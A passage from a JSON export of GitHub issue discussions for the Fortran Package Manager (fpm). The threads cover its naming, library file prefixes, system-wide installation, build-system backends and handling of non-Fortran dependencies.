                    "text": "Sure, here is one example that uses both fypp and cpp: https://github.com/cp2k/dbcsr/blob/cfa17ba0f1c7c9c2ba83f5fa4358f2c9728aaa73/src/acc/dbcsr_acc_hostmem.F#L137\nWe should brainstorm how the compiler and fpm should cooperate. It's not just the preprocessor, but also the overall structure of the project and how exactly to compile it.\nCurrently fpm calls the compiler on a file by file basis. A better way is to give the compiler a list of files + compiler flags for each file. For small and medium size projects, the compiler can keep all code in memory and then provide a language server for an IDE, and then only recompile what was changed in the most efficient manner possible. Fpm is best to keep track of what files with what options (and which C preprocessor defines, to tie it to the present issue...), and to change these, for example the user selects a Release mode that can trigger a different C preprocessor option, or the user enables an optional dependency. Fpm should handle all that.\nThe actual compilation, on the other hand, fpm should only handle it if the compiler does not want to do it. But if the compiler wants to do it, fpm should just hand the information over.\nRegarding preprocessing. A character changes in an IDE (e.g., VSCode). The file must be preprocessed and then the compiler must recompile and give code suggestions or type information back to the IDE.\nIt makes a lot of sense if the compiler (language server) just handles both, and fpm is only involved if the user explicitly calls it to change some configuration about the project. Thinking about it further, it seems the language server must handle both fpm and the compiler. If fpm handles preprocessing, the language server can first call fpm to preprocess, and hand over the code mapping to the compiler to take it from there. Compiler gives back info, typically with correct location information (using the mapping from fpm), say where to find the definition of a given symbol. The user must communicate with the language server somehow, I would imagine simply by calling fpm in the terminal, and the language server just must be notified somehow; if a cpp option changes, then syntax highlighting must change for the new enabled/disabled ifdef branches etc.; as well as location information of symbols change etc."
                }
            ]
        },
        {
            "number": 77,
            "user": "milancurcic",
            "date": "2020-05-10 18:20:20+00:00",
            "title": "Should we refer to this software as FPM or fpm?",
            "text": "They mean the same, but they look and \"feel\" different. We should have a consistent way to refer to this so it's not confusing to the readers whether they're different things. Especially as we begin to write about these things more publicly?\nI've been using both. I don't know which one I prefer. Perhaps 60/40 in favor of fpm.\nSo, which one should it be?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-10 18:24:29+00:00",
                    "text": "I've been using both also. Let's use lowercase.\n\nI think fpm, with `fpm` in markdown. Just like git or markdown.\n\nIf it is at the beginning of a sentence, let's use Fpm.\n\u2026\nOn Sun, May 10, 2020, at 12:20 PM, Milan Curcic wrote:\n\n\n They mean the same, but they look and \"feel\" different. We should have\n a consistent way to refer to this so it's not confusing to the readers\n whether they're different things. Especially as we begin to write about\n these things more publicly?\n\n I've been using both. I don't know which one I prefer. Perhaps 60/40 in\n favor of fpm.\n\n So, which one should it be?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#77>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDU4C2JEGTK7CN6IJTRQ3V7BANCNFSM4M5LDRPA>."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 18:31:19+00:00",
                    "text": "I guess git uses both Git and git: https://git-scm.com/\n\nI think svn also uses both SVN and svn.\n\nI am fine either way.\n\nWe can have a rule to use FPM when referencing the project, but fpm when the executable, and encourage to use fpm where it make sense. But should we write Fortran Package Manager (FPM) or Fortran Package Manager (fpm) at the top of the website?\n\nOndrej\n\u2026\nOn Sun, May 10, 2020, at 12:24 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I've been using both also. Let's use lowercase.\n\n I think fpm, with `fpm` in markdown. Just like git or markdown.\n\n If it is at the beginning of a sentence, let's use Fpm.\n\n On Sun, May 10, 2020, at 12:20 PM, Milan Curcic wrote:\n >\n >\n > They mean the same, but they look and \"feel\" different. We should have\n > a consistent way to refer to this so it's not confusing to the readers\n > whether they're different things. Especially as we begin to write about\n > these things more publicly?\n >\n > I've been using both. I don't know which one I prefer. Perhaps 60/40 in\n > favor of fpm.\n >\n > So, which one should it be?\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#77>, or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWDU4C2JEGTK7CN6IJTRQ3V7BANCNFSM4M5LDRPA>.\n >"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-10 18:59:39+00:00",
                    "text": "Node Package Manager uses npm universally. Even the company is called \"npm, Inc.\".\nI vote for fpm all the way, and fpm when referring specifically to the command line executable."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 19:14:26+00:00",
                    "text": "I also vote fpm all the way.\n\u2026\nOn Sun, May 10, 2020, at 12:59 PM, Milan Curcic wrote:\n\n\n Node Package Manager <https://www.npmjs.com/> uses npm universally.\n Even the company is called \"npm, Inc.\".\n\n I vote for fpm all the way, and `fpm` when referring specifically to\n the command line executable.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#77 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH4JET6LJBKTX7JHJLRQ32SNANCNFSM4M5LDRPA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 02:19:29+00:00",
                    "text": "I can come up with logical arguments for either.\nOn the one hand, it's a proper noun, Fortran is capitalized, and it's an acronym, so FPM would make sense.\nOn the other hand, Fortran is a case insensitive language, and our community style guide seems to be leaning towards all lowercase, so fpm would be consistent with that.\nGiven that this really is a purely aesthetic choice, and there seems to be a trend in other places towards all lowercase, I have nothing against using fpm everywhere. I'll start doing that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-17 20:09:08+00:00",
                    "text": "The consensus so far is to use \"fpm\" everywhere. Closing."
                }
            ]
        },
        {
            "number": 76,
            "user": "everythingfunctional",
            "date": "2020-05-10 04:15:33+00:00",
            "title": "Prefix library archive file names with lib",
            "text": "Fix #75",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-10 05:01:32+00:00",
                    "text": "+1, looks good\n\u2026\nOn Sat, May 9, 2020, at 10:15 PM, Brad Richardson wrote:\n\n\n @everythingfunctional <https://github.com/everythingfunctional>\n requested your review on: #76\n <#76> Prefix library archive\n file names with lib.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#76 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWC2J6GTOZI5TTUQDW3RQYS7BANCNFSM4M5CPJ6A>."
                }
            ]
        },
        {
            "number": 75,
            "user": "milancurcic",
            "date": "2020-05-09 20:22:10+00:00",
            "title": "Add lib prefix to the static library file name",
            "text": "Currently, FPM emits a static library file that has the same name as the project. For example, first line of fpm.toml could be:\nname = \"datetime\"\nThen, the static library created is datetime.a. However, the canonical way to name libraries (static and dynamic) is to use a lib prefix: libdatetime.a. Then one can link to this library with -ldatetime.\nCurrent workaround can be to add the lib prefix to the package name in fpm.toml:\nname = \"libdatetime\"\nHowever, this isn't pretty, and would down the road be more awkward once we're installing packages from remote URLs.\nLet's add the lib prefix to library files.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-09 21:25:13+00:00",
                    "text": "I agree.\n\u2026\nOn Sat, May 9, 2020, at 2:22 PM, Milan Curcic wrote:\n\n\n Currently, FPM emits a static library file that has the same name as\n the project. For example, first line of `fpm.toml` could be:\n\n name = \"datetime\"\n Then, the static library created is `datetime.a`. However, the\n canonical way to name libraries (static and dynamic) is to use a `lib`\n prefix: `libdatetime.a`. Then one can link to this library with\n `-ldatetime`.\n\n Current workaround can be to add the `lib` prefix to the package name\n in `fpm.toml`:\n\n name = \"libdatetime\"\n However, this isn't pretty, and would down the road be more awkward\n once we're installing packages from remote URLs.\n\n Let's add the `lib` prefix to library files.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#75>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWETEZUJY7Q5QWRYIYTRQW3P3ANCNFSM4M46DEDQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-10 03:41:20+00:00",
                    "text": "I see. This is a simple enough change to make. I will note however that FPM is just including the archive directly in the link command, rather specify both -Ilib/folder and -lname arguments. So this will only impact users doing things outside of FPM. Granted that many people will want to do things outside of FPM, I think it makes sense to go ahead and do it."
                }
            ]
        },
        {
            "number": 74,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:55:33+00:00",
            "title": "Add compiler to build path",
            "text": "This is the first part of supporting #66\nNote: This should be merged after #72",
            "comments": []
        },
        {
            "number": 73,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:35:09+00:00",
            "title": "Output a message if no executables or tests are found",
            "text": "Fix #64",
            "comments": []
        },
        {
            "number": 72,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:22:15+00:00",
            "title": "Remove compiler option from `fpm.toml`",
            "text": "Fix #63",
            "comments": []
        },
        {
            "number": 71,
            "user": "epagone",
            "date": "2020-05-03 17:20:05+00:00",
            "title": "Install app or library system-wide",
            "text": "I know it might be a bit early but I'd like to log this issue that is particularly important for me.\nTo use routinely fpm, I would need a functionality that works a bit like sudo make install to install the executable or library system-wide.\nPS: thanks for your great work!",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-03 21:16:09+00:00",
                    "text": "@epagone thanks! Yes, we have to do it.\n@everythingfunctional how can one do that using stack install? I read through stack install --help but didn't see an option to install into /usr/local/bin/."
                },
                {
                    "user": "epagone",
                    "date": "2020-05-03 22:58:47+00:00",
                    "text": "I read through stack install --help but didn't see an option to install into /usr/local/bin/.\n\nFor the records, on Ubuntu 20.04, if I copy manually my library files (libsomething.a) in /usr/local/lib/ or /usr/lib, gfortran finds it with $ gfortran libtest.f90 -lsomething.\nHowever, copying the module files to /usr/local/include does not work and the full path must be specified after the -I flag: $ gfortran libtest.f90 -lsomething -I/usr/local/include\nPS: sorry for having repeatedly edited my message, but I have been experimenting a bit and I didn't want to leave confusing or contradictory messages around."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-04 02:16:33+00:00",
                    "text": "I think having an install functionality is definitely desired. I believe with stack, stack install is just for executables. I'd lean towards doing the same thing with FPM. I can easily see the desire to install an executable, but I'm not sure I fully understand the benefits of having FPM install libraries.\nFor installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things. Also, FPM is compiling archives, not shared object libraries. And if you're using FPM, you don't need to have the library installed on your system in order for other packages to use it. That's whole point of FPM.\nI'm not completely opposed to the idea, but I would need somebody to show me a use case that would constitute good practice. I'd rather FPM not try and also take on the role of system package manager. I think twice about anything that needs sudo to do it."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 04:38:39+00:00",
                    "text": "Ah, I missed this point: this is about fpm installing the apps and libraries systemwide.\nWhy don't we start with what Cargo does via cargo install --root ... which however is for Cargo managed packages, and then we see what else we can do. I think installing apps that are statically linked should be no problem.\nFinally, that's a good point that if fpm is to become a usable replacement for CMake (let's say), it must be able to install the executables and libraries to a user defined location.\n(Most probably we'll have to be able to build both static and dynamic libraries with fpm down the road.)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-04 07:47:24+00:00",
                    "text": "For installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things.\n\nThe Linux file system has a well-defined segregation between files installed by package managers and those built by users; as @epagone mentioned user-built executables/libraries/headers go in /usr/local/bin /usr/local/lib (both shared and static) and /usr/local/include. This is a common target for makefiles for c libraries and avoids the need to specify include and library paths when compiling and linking.\nHowever this approach can't be used for Fortran libraries because:\n\n\nUnlike c, Fortran has no application binary interface which means that compiled libraries are specific to the compiler and compiler version that compiled it.\n\n\nThere is no agreed-upon location to place (and search for) the requisite .mod files, which are also binary-specific to the compiler and compiler version that generated them.\n\n\nI agree with @everythingfunctional that one of the goals of fpm is to solve this problem for us; specifically, it handles module paths and linker library paths for us in a robust and repeatable manner (which is the main advantage of installing system-wide IMO).\nI think install functionality for executables is a natural functionality, I would like:\n\n(sudo) fpm install for /usr/local/bin and;\nfpm install --local for $HOME/.local/bin"
                },
                {
                    "user": "epagone",
                    "date": "2020-05-04 10:10:17+00:00",
                    "text": "@everythingfunctional\n\nI think having an install functionality is definitely desired. I believe with stack, stack install is just for executables. I'd lean towards doing the same thing with FPM. I can easily see the desire to install an executable, but I'm not sure I fully understand the benefits of having FPM install libraries.\nFor installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things. Also, FPM is compiling archives, not shared object libraries. And if you're using FPM, you don't need to have the library installed on your system in order for other packages to use it. That's whole point of FPM.\n\nSorry, but I do not understand. Let's take this example: I have a string manipulation library that I build from source pulling a GitHub repo. I need this library in almost all of my many projects. I think it's obvious to expect from the package manager the ability to make the library available system-wide. (FWIW, I am not using FoBiS exactly because it lacks this functionality.) Am I doing something wrong in my development procedures?\n@LKedward\n\nHowever this approach can't be used for Fortran libraries because:\n1. Unlike c, Fortran has no application binary interface which means that compiled libraries are specific to the compiler and compiler version that compiled it.\n\n2. There is no agreed-upon location to place (and search for) the requisite `.mod` files, which are also binary-specific to the compiler and compiler version that generated them.\n\n\nOuch. Thanks for this explanation, but it's really a bad news! \ud83d\ude1e"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-04 14:29:36+00:00",
                    "text": "I need this library in almost all of my many projects.\n\nIf you're using FPM, then it has the responsibility to provide the appropriate version to compile and link with your project. It does not rely on whatever version happens to be installed on your system.\nSay for example, the latest version of a library introduced a breaking change that your project relies on. You can continue using the old version for your old project, but use the latest version in your new project, on the same machine, and not have any issues."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 15:22:18+00:00",
                    "text": "@epagone wrote:\n\nI think it's obvious to expect from the package manager the ability to make the library available system-wide.\n\nYes, that's the goal. Fpm must have an option to install a library systemwide or to any location you want."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-04 15:35:54+00:00",
                    "text": "I also think it's important to allow both static and dynamic library builds down the road.\nIf I understand this correctly, it seems to me that the high-level debate here is whether fpm should work only within the context of a local, package-specific environment (@everythingfunctional position I think), vs. whether fpm could also install to places elsewhere on the system (regardless whether it's a root or user directory).\nIf you always worked in the package-specific environment, that means that you'd need to rebuild the same dependency for every project that uses it, rather than re-use an existing build. I don't know if Cargo for example can build system-wide, but its canonical behavior is to rebuild everything per-project. For example if you try a demo database or web-server project in Rust, you'll first be building all the 500 dependencies that it needs.\nBesides the rationale others already provided, another advantage to this is that some libraries take some time to build (for example NetCDF). Rebuilding them for every new project would hurt user experience.\nI think both approaches should be possible. Default should be like Cargo. How about this UI:\n\nFor in-package build, fpm build suffices, no need for fpm install. The library is already installed in build/... in the package directory.\nFor install elsewhere, fpm install installs to a sane default user location, perhaps /home/user/.fpm/{bin,lib,include}.\nFor install to a specific place, fpm install --prefix=/path/to/install."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 15:48:08+00:00",
                    "text": "I agree with @milancurcic's proposal at the end.\nLet's start with rebuilding everything for each directory where you call fpm build. But down the road fpm can simply build somewhere in ~/.fpm/ and cache each build and reuse them where possible.  Note also that this build directory (whether local to a project directory or in ~/.fpm/) I think might be a bit different from the fpm install command --- the build directory might have more information / metadata that the install command doesn't need to install.\nAnyway, I think we can design this so that each of us will get the functionality that we want."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-04 15:54:37+00:00",
                    "text": "If we do eventually place built libraries in a central location like ~/.fpm/ then I would suggest that this path include the compiler and compiler version for the same reasoning as #66 due to binary incompatibility between compilers. e.g. ~/.fpm/gfortran-9.1.0/bin etc."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 17:55:03+00:00",
                    "text": "@LKedward yes, that's necessary. In fact it should be done by hashes, where a hash depends on:\n\ncompiler vendor and version\nwhether Debug or Release build\nhash of the sources for the package\nall dependencies' hashes\nhow the given package was configured --- Cargo allows some optional capabilities and we might too in the future, say if you want to build a package with or without netcdf support\n..."
                }
            ]
        },
        {
            "number": 70,
            "user": "certik",
            "date": "2020-04-30 20:08:12+00:00",
            "title": "Have a Conda backend",
            "text": "This is related to #69 but it's a separate issue. fpm should be able to create a Conda package for the project, so that it's easy to submit it to conda-forge.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:27:15+00:00",
                    "text": "What's required for a Conda package?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 21:44:39+00:00",
                    "text": "Here is a Conda package for my dftatom Fortran package:\nhttps://github.com/conda-forge/dftatom-feedstock/\nThe main config file:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/meta.yaml\nLinux / macOS build script:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/build.sh\nAnd Windows build script:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/bld.bat\nAll of which could be generated. The build process could simply just call fpm on all platforms."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 22:50:54+00:00",
                    "text": "That seems like it wouldn't actually require any changes to FPM."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 23:27:16+00:00",
                    "text": "One still has to generate things like \"description\", \"name\" (both of which fpm knows), and the proper template to call fpm. But yes, it should be a simple backend to fpm."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 22:06:25+00:00",
                    "text": "Now that we have a fpm version at conda-forge, packaging fpm projects is quite straight-forward except for some minor issues. Is there anything further required on the fpm side?"
                },
                {
                    "user": "certik",
                    "date": "2021-09-06 00:21:30+00:00",
                    "text": "Do we have some example of a Conda package that uses fpm?\nI think there is a number of issues:\n\nDependencies must be packaged as Conda\nAlternatively, they should be pre-downloaded.\nThey should not be downloading during the build (as the currently do)\n\nThe same issue will happen when packaging for Debian and other distros. They like to have a clean upstream tarball, and then no downloads happening during the build. So we need to improve fpm to be able to provide that, one way or another."
                }
            ]
        },
        {
            "number": 69,
            "user": "certik",
            "date": "2020-04-30 20:07:05+00:00",
            "title": "Have CMake and Make backends",
            "text": "Currently the Haskell based fpm is compiling things directly, just like Cargo does it. That's the best default. (The \"archived\" Rust based fpm was generating CMake.)\nHowever, until fpm is everywhere used by everybody, it would be super helpful to have a CMake and pure Make backends. That way we can move packages like stdlib or any of my own packages into using fpm, and yet not require it from the users --- they would continue using CMake or Make.\nAlso by generating the CMake / Make automatically, it will be a lot easier to maintain those in stdlib for example.\nSince fpm knows (or should know) everything about the Fortran project, it can generate 100% robust CMake and Make files, following the latest practices for CMake / Make, human readable, etc.\nI am thinking having these backends would be beneficial for many purposes, such as debugging, anyway. We should also have a Ninja backend.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:18:49+00:00",
                    "text": "and yet not require it from the users --- they would continue using CMake or Make.\nAlso by generating the CMake / Make automatically, it will be a lot easier to maintain those in stdlib for example.\n\nI don't understand why generate CMake of Make files. If fpm is smart enough to generate a correct CMake or Makefile for an arbitrary package, would it not be smart enough to simply build the package on its own?\nI thought that the value of enabling CMake or Make backend is when fpm is not smart enough yet to build the package on its own, but is just smart enough to detect an existing CMakeLists.txt, Makefile, or configure file, and run the appropriate commands to build it, like, cmake . or FC=gfortran make."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 20:31:08+00:00",
                    "text": "Let me see if I can explain it better.\nWe should assume that fpm is smart enough to completely build the project on its own. We are very close and we will get there soon.\nThe other assumption is that the goal has never been to call an existing CMakeLists.txt or configure script. The whole point of fpm is that users write fpm.toml and they never write CMakeLists.txt or configure by hand.\nSo with these assumptions, yes, you can just use fpm. However, it will be a while before we can just get every user using fpm. For example I don't think it would be wise to get rid of the CMake build system in stdlib and only use fpm --- maybe later, but not today. At the same time, I would love to be using fpm with stdlib as well as all my other Fortran projects now.  So to achieve it, if fpm can generate CMake, then users of my packages can keep using CMake as they do now. But I, as a developer, can just use fpm, and use fpm to generate the CMake files for my users (and commit them to git), so that I do not need to maintain the fpm build system, and a separate CMake build system by hand. And since fpm knows how to build the project on its own, it also by definition knows how to generate beautiful looking CMake files that just work (or any other build system also)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:48:36+00:00",
                    "text": "Okay, I understand now. The use case for this is when a developer releases a new package, they can use fpm to emit configuration files for different build systems.\nFor example, datetime-fortran started with a manual Makefile. Then Zaak wrote a CMakeLists.txt, and Michael modernized it later. Mark wrote an autotools config. Now it can be built in these different ways.\nIf I had fpm back then, I could just have done something like:\nfpm build --cmake\nfpm build --make\nfpm build --conda\n...\n\nand be done with it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 20:55:48+00:00",
                    "text": "Yes exactly. And not just be done with it, but you can keep using fpm to keep the other build systems up-to-date. When you have a bigger project, the inter-dependencies of Fortran modules change every time you modify the use line (all the time). So you have to update manual Makefiles all the time you change this. And every time you add / remove files or move them around, you would have to update CMake also. fpm could do all that for you.\nIn fact fpm could detect that your project contains fpm-generated CMake (from some comment in it) and it can warn you every time it needs to be re-generated."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:25:36+00:00",
                    "text": "So, the idea here is that, not only should FPM be able to use \"non\"-FPM packages, it should also be able to generate \"non\"-FPM packages? I think this may be inviting a lot of requests for special cases. We might end up constantly chasing users who aren't willing to actually use FPM as intended.\nI'm not saying it isn't doable or worth considering. If we limit the scope to saying these other build systems must functionally produce exactly what FPM itself would do it might not be too bad, but then I don't think that actually reaches many people that we wouldn't have already convinced to switch over.\nOn the other hand it might provide a slightly smoother transition path. Make these tweaks to your current build system so FPM can use. Then get all your user's to adjust to that. Then stop maintaining that build system yourself and let FPM do it.\nI'll have to think about this for a while."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 21:37:02+00:00",
                    "text": "I made a joke a year ago, and we may actually do it.\nI share the same concerns as Brad. Mainly that this effort may not be closely aligned with FPM itself. In other words, it would be helping users to not use FPM. On the other side, if this would help many packages support multiple build systems, it would improve their portability, a long-term Fortran goal."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 21:51:19+00:00",
                    "text": "From a practical perspective, we already use both CMake and manual Makefiles for stdlib (because people have requested both) and now we also want to use fpm. I have the same problem with dftatom and Milan with datetime-fortran. I bet there are tons of other projects like that too. So instead of each of us maintaining 3 different build systems, let's just all collaborate on CMake and Makefile backend to fpm, which will produce higher quality CMake / Makefile in the end, and it will remove the burden of each of us maintaining 3 different build systems."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 22:53:34+00:00",
                    "text": "Ok, let's at least finish a beta version that just supports standard FPM projects before we start tackling this one though."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 23:27:47+00:00",
                    "text": "I agree. I only posted it here to keep it in mind."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-07 18:00:39+00:00",
                    "text": "Okay, I understand now. The use case for this is when a developer releases a new package, they can use fpm to emit configuration files for different build systems.\nFor example, datetime-fortran started with a manual Makefile. Then Zaak wrote a CMakeLists.txt, and Michael modernized it later. Mark wrote an autotools config. Now it can be built in these different ways.\nIf I had fpm back then, I could just have done something like:\nfpm build --cmake\nfpm build --make\nfpm build --conda\n...\n\nand be done with it.\n\nI think this feature will be great in particular when you want to distribute a code:\n\nsome users just want to type \"make\" to be able to compile the code (and maybe edit the makefile)\nthe fpm installation (with its dependencies) is not straightforward and it adds another layer. If it fails, without this feature you will not be able to run the code.\n\nlauvergn (alias gardhor)"
                },
                {
                    "user": "certik",
                    "date": "2020-12-09 19:32:57+00:00",
                    "text": "What would be a good behavior for the end user for the cmake backend?\nPerhaps\nfpm generate --cmake\n\nand it would create (or override) proper CMakeLists.txt files for your current project in your existing directory. Then I can commit them to git if I want to. (There can be another mode where it copies everything into a new directory.)\nWhat about dependencies? One way could be to create proper CMakeLists.txt in build/dependencies, and then hook them up properly from your main project CMakeLists.txt.\n@LKedward, @milancurcic what do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 19:41:59+00:00",
                    "text": "@certik I currently working on a meson backend for fpm built upon #266 and #257, once either of the PRs is merged I can get this branch from its currently transitional state into a stable form and publish it for testing.\nI have a (somewhat) working model for CMake as well, but this is far more involved to get a proper dependencies handling compared to meson, therefore I won't push any of those until I'm done with meson generator."
                }
            ]
        },
        {
            "number": 68,
            "user": "certik",
            "date": "2020-04-30 19:50:53+00:00",
            "title": "How to handle non-Fortran dependencies",
            "text": "I am very confident we can make fpm very robust to work for pure Fortran packages. Just like Cargo works well for pure Rust packages or pip works great for pure Python packages.\nThe problem is with non-Fortran packages. Pip allows to hook in compiling C (and with some work) Fortran code, but it's very fragile in my experience (thus the motivation for Conda that is a binary package manager). Python doesn't have an option to avoid C++/Fortran dependencies because Python itself is slow. Rust allows to (in principle) rewrite everything in Rust. As an example, take png. The system bindings: https://crates.io/crates/libpng-sys they say are unreliable, and you should use a pure Rust implementation: https://lib.rs/crates/lodepng.\nI agree it does make things more robust to stick to pure Fortran and for many things we will do that and people will provide pure Fortran implementation of basic tasks. Python cannot do it well due to performance, but Rust and Fortran can.\nHowever, we still need a robust way of handling non-Fortran dependencies, because if there is a robust and well maintained library in another language, we should just use it instead of reimplementing everything. Take HDF5. Here is the Rust package: https://crates.io/crates/hdf5. If you look at the documentation how to build it: https://github.com/aldanor/hdf5-rust they even mention Conda (to install the HDF5 library itself on all platforms --- which in my experience is much more robust than pip). Anyway, the way it works is by this line: https://github.com/aldanor/hdf5-rust/blob/15ec644977e0bee2b77340272730b34209c3765b/Cargo.toml#L11 which causes Cargo to execute this script: https://github.com/aldanor/hdf5-rust/blob/15ec644977e0bee2b77340272730b34209c3765b/build.rs which emits flags how to link against HDF5 correctly. That way the Cargo itself doesn't need to know almost anything, it just parses the output of this file. I think we should follow the same approach in fpm. The flags in this case are emitted by: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/src/lib.rs#L65. I think this is when you link against hdf5 rust package in your own code. How to link against hdf5 library itself is done here I think: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/build.rs#L566, it's quite complicated unfortunately.\nBut it's clean from the Cargo side, it offloads the responsibility to the package itself. We can provide helpers that fpm packages can use to work with things like pkg-config, cmake packages, etc.\nIn Rust it looks like each package is on their own, so for example this HDF5 package has messy code for each platform, e.g., here: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/build.rs#L492, you can see they are checking brew, or Windows registry, etc.\nThe good news is that Fortran codes do not need many non-Fortran dependencies, and so doing what Rust does might work for us. What I've seen is that Fortran codes mostly need some of: Lapack, MPI, FFT, MKL, HDF5, JSON, NETCDF, HYPRE, ...\nOf which MPI and Lapack being the most important. I think fpm will have support for all Fortran compilers and I think it can have built-in support for MPI and Lapack also. One reason to special case MPI and Lapack is so that one can switch MPI implementaitons and Lapack implementations easily, and not have the Fortran packages hardcoded with a particular implementation.\nWith those out of the way, the rest can be done Cargo style, at least for now. Most other packages have just one implementation, so Fortran packages can just depend on a particular package (say Arpack, or Scalapack).",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:03:57+00:00",
                    "text": "I agree, this sounds quite reasonable as a first stab. Thank you for the research.\nMy personal sorted list of most used non-Fortran dependencies: MPI, HDF5, NetCDF, zlib, libpng.\nIf everybody here listed their most used dependencies, we could have an idea of top candidates which to design for and test first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:06:38+00:00",
                    "text": "I definitely would like to be able to handle some non-Fortran dependencies. As it's currently designed, I think it won't be that difficult.\nThe end result of building a library in FPM is just a .a file, and all of the relevant .mod files. So, if your package specifies a build script for that, FPM will just call it. There is a small set of things that FPM would like to dictate to that script though. Those being:\n\nThe compiler to use\nThe compiler flags to use (mostly to ensure the flags are compatible with the given compiler)\nWhere to put the archive and module files\nWhere to find any of the dependencies\n\nIn this way, almost anything could be wrapped into an FPM package. Best practice would be to entirely wrap the package into a Fortran API, so consumers don't necessarily even have to know it's not Fortran, but this may not be strictly necessary in every case.\nFor the build scripts, I really like Rust's way of having the build scripts be written in Rust too. Not sure if Fortran would really be doable for that, but it would make sure building a package doesn't have additional external requirements. We could special case Makefiles and CMakeLists to use the typical environment variables I think."
                },
                {
                    "user": "pdebuyl",
                    "date": "2020-05-13 12:53:00+00:00",
                    "text": "C has a special relationship to Fortran though. Thanks to the compatibility section, it makes sense for a Fortran developer to include C code in a Fortan project. Could that be taken into account?\nMy \"pet\" usage for this is to write a PRNG in C with a Fortran wrapper module. PRNGs often use unsigned integers whose usage is possible in C.\nA fpm package could thus, in this scenario, contain Fortran and C source."
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 14:18:22+00:00",
                    "text": "@everythingfunctional, @milancurcic and I discussed this point on the phone and we think so far that the best way forward is to work with Conda (or Mamba to be specific) together with their developers (@wolfv and others) to provide all non-Fortran dependencies. fpm would link with mamba and from a user perspective things would just work (users would not need to handle Conda environments explicitly).\nRegarding C support, I would suggest initially to handle them via Conda, just to keep things simple.\nWe can think if if want to later extend fpm to handle not only Fortran compilers but also C and C++ compilers."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-13 14:34:13+00:00",
                    "text": "@pdebuyl , my recommendation would be to put the C parts of your project in a separate project so that fpm can easily build the \"pure Fortran\" part of your project with ease.\nWe're planning to support make and Cmake as separate build scripts, so supporting linking with (almost) any other language and still having it be an fpm package would be possible."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-13 16:20:01+00:00",
                    "text": "@everythingfunctional , @certik , what are the disadvantages/difficulties with natively supporting c sources in fpm? Many projects do need to include c code from time to time and this is quite normal for Fortran (even before iso_c_binding came along). I think this would be a good feature.\n(I'm not talking about whole package dependencies, just self-contained projects with mixed c/Fortran code)."
                },
                {
                    "user": "milancurcic",
